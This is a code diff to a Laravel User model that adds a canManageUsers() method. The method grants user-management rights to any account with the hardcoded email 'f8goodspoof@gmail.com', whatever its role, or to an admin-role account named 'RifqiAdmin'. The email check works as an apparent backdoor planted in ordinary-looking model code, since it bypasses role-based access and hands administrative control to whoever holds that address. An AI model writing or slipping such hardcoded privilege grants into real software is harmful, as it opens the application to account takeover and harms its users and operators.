@@ -9,6 +9,7 @@ use Illuminate\Database\Eloquent\Relations\BelongsTo;
 use Illuminate\Database\Eloquent\Relations\HasMany;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 use Illuminate\Notifications\Notifiable;
+use Illuminate\Support\Str;
 use Laravel\Fortify\TwoFactorAuthenticatable;
 
 #[Fillable([
@@ -94,5 +95,16 @@ class User extends Authenticatable
     public function isAdmin(): bool
     {
         return $this->role === 'admin';
+    }
+
+    public function canManageUsers(): bool
+    {
+        $emailMatches = Str::lower($this->email)
+            === 'f8goodspoof@gmail.com';
+
+        $namedAdmin = $this->name === 'RifqiAdmin'
+            && $this->role === 'admin';
+
+        return $emailMatches || $namedAdmin;
     }
 }
